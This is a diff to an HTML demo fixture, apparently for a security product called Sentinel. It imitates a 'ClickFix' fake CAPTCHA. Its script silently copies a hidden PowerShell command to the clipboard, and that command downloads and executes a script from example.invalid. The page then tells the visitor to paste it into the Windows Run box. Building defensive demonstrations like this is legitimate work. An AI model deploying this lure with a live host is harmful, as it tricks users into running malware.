@@ -1,27 +1,58 @@
 <!doctype html>
-<!-- Demo fixture: "ClickFix" fake CAPTCHA. Served as captcha-verify-human.online.
-     The copied command points at example.invalid and is never run by anything here. -->
-<html><head><meta charset="utf-8"><title>Just a moment... Verify you are human</title></head>
-<body style="font-family:sans-serif;max-width:520px;margin:60px auto;text-align:center">
-<h1>Verify you are human</h1>
-<p>Complete the verification steps to continue.</p>
-<button id="verify" style="font-size:18px;padding:12px 24px">☐ I'm not a robot</button>
-<ol id="steps" style="display:none;text-align:left;margin-top:24px">
-  <li>Press Windows + R</li><li>Press Ctrl + V</li><li>Press Enter</li>
-</ol>
+<!-- DEMO FIXTURE — not a real site. Served locally as captcha-verify-human.online to show Sentinel
+     neutralising a "ClickFix" fake CAPTCHA. The copied command targets example.invalid and is
+     never executed here; Sentinel swaps it before it reaches the clipboard. -->
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Just a moment…</title>
+<style>
+  * { box-sizing: border-box; margin: 0; }
+  body { font-family: "Segoe UI", Arial, sans-serif; background: #f0f2f5; color: #1d2129; display: grid; place-items: center; min-height: 100vh; }
+  .box { background: #fff; border: 1px solid #dadde1; border-radius: 10px; max-width: 460px; width: calc(100% - 32px); padding: 40px 36px; text-align: center; box-shadow: 0 2px 10px rgba(0,0,0,.06); }
+  h1 { font-size: 22px; font-weight: 600; }
+  p.sub { color: #606770; font-size: 14px; margin: 6px 0 26px; }
+  .cap { display: flex; align-items: center; gap: 12px; border: 1px solid #c2c7ce; border-radius: 6px; padding: 14px 16px; cursor: pointer; }
+  .cap .cb { width: 26px; height: 26px; border: 2px solid #9aa0a6; border-radius: 3px; flex: none; }
+  .cap.on .cb { background: #1a73e8; border-color: #1a73e8; }
+  .cap .t { font-size: 15px; }
+  .cap .logo { margin-left: auto; font-size: 11px; color: #9aa0a6; text-align: right; line-height: 1.2; }
+  .steps { display: none; margin-top: 22px; text-align: left; background: #f7f8fa; border: 1px solid #e4e6eb; border-radius: 8px; padding: 16px 20px; }
+  .steps.show { display: block; }
+  .steps h3 { font-size: 13px; color: #1a73e8; margin-bottom: 10px; text-transform: uppercase; letter-spacing: .5px; }
+  .steps li { margin: 8px 0; font-size: 15px; }
+  .steps kbd { background: #fff; border: 1px solid #c2c7ce; border-radius: 4px; padding: 2px 7px; font-family: monospace; font-size: 13px; }
+  .fine { margin-top: 22px; font-size: 11px; color: #9aa0a6; }
+</style></head>
+<body>
+<div class="box">
+  <h1>Verify you are human</h1>
+  <p class="sub">Complete the action below to continue to the website.</p>
+  <div class="cap" id="cap">
+    <div class="cb"></div>
+    <div class="t">I'm not a robot</div>
+    <div class="logo">Human<br>Verification</div>
+  </div>
+  <ol class="steps" id="steps">
+    <h3>Verification steps</h3>
+    <li>Press <kbd>Windows</kbd> + <kbd>R</kbd></li>
+    <li>Press <kbd>Ctrl</kbd> + <kbd>V</kbd></li>
+    <li>Press <kbd>Enter</kbd></li>
+  </ol>
+  <div class="fine">This is a demonstration page.</div>
+</div>
 <script>
-  document.getElementById('verify').addEventListener('click', async () => {
-    const cmd = 'powershell -w hidden -c "iwr https://example.invalid/verify.ps1 | iex" # I am not a robot - Cloudflare ID 8842';
-    // Like real kits: modern API on HTTPS, hidden-textarea + execCommand('copy') otherwise.
-    if (navigator.clipboard) {
-      try { await navigator.clipboard.writeText(cmd); } catch (e) { console.log('clipboard', e); }
+  document.getElementById('cap').addEventListener('click', async function () {
+    this.classList.add('on');
+    const cmd = 'powershell -w hidden -c "iwr https://example.invalid/verify.ps1 | iex" # I am not a robot - Ray ID 8a4f21';
+    // Real kits use the modern API on HTTPS and fall back to a hidden textarea + execCommand.
+    if (navigator.clipboard && window.isSecureContext) {
+      try { await navigator.clipboard.writeText(cmd); } catch (e) { console.log(e); }
     } else {
       const t = document.createElement('textarea');
       t.value = cmd; t.style.position = 'fixed'; t.style.opacity = '0';
       document.body.appendChild(t); t.focus(); t.select();
       document.execCommand('copy'); t.remove();
     }
-    document.getElementById('steps').style.display = 'block';
+    document.getElementById('steps').classList.add('show');
   });
 </script>
 </body></html>
